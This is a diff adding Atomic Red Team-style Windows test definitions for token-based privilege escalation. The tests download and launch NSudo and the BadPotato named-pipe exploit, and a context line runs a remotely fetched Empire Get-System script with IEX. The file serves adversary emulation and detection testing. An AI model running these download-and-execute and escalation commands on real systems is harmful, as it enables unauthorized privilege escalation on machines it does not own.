@@ -29,3 +29,58 @@ atomic_tests:
       IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
     name: powershell
     elevation_required: true
+- name: Launch NSudo Executable
+  auto_generated_guid: 7be1bc0f-d8e5-4345-9333-f5f67d742cb9
+  description: |-
+    Launches the NSudo executable for a short period of time and then exits.
+    NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.
+  supported_platforms:
+  - windows
+  input_arguments:
+    nsudo_path:
+      description: 'Path to the NSudo bat file'
+      type: Path
+      default: $env:TEMP\NSudo_8.2_All_Components\NSudo_Launcher\x64\NSudoLG.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      NSudo.bat must exist in the specified path #{nsudo_path}
+    prereq_command: |
+      if (Test-Path #{nsudo_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -OutFile $env:TEMP\NSudo_8.2_All_Components.zip "https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"
+      Expand-Archive -Path $env:TEMP\NSudo_8.2_All_Components.zip -DestinationPath $env:TEMP\NSudo_8.2_All_Components -Force
+      Rename-Item "$env:TEMP\NSudo_8.2_All_Components\NSudo Launcher" $env:TEMP\NSudo_8.2_All_Components\NSudo_Launcher
+      Remove-Item $env:TEMP\NSudo_8.2_All_Components.zip -Recurse -ErrorAction Ignore
+  executor:
+    command: |
+     Start-Process #{nsudo_path} -Argument "-U:T -P:E cmd"
+     Start-Sleep -Second 5
+     Stop-Process -Name "cmd" -force -erroraction silentlycontinue
+    name: powershell
+- name: Bad Potato
+  auto_generated_guid: 9c6d799b-c111-4749-a42f-ec2f8cb51448
+  description: |-
+    https://github.com/BeichenDream/BadPotato
+    Privilege escalation using named pipe connections
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies: 
+  - description: |
+      BadPotato.exe must exist in the temp directory
+    prereq_command: |
+      if (Test-Path $env:temp\BadPotato.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -OutFile $env:TEMP\BadPotato.exe "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+  executor:
+    command: |
+     cd $env:temp
+     Start-Process .\BadPotato.exe notepad.exe
+     Start-Sleep -Second 20
+     Stop-Process -Name "notepad" -force -erroraction silentlycontinue
+     Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
+    cleanup_command: |
+      taskkill /f /im notepad.exe
+    name: powershell
+    elevation_required: true
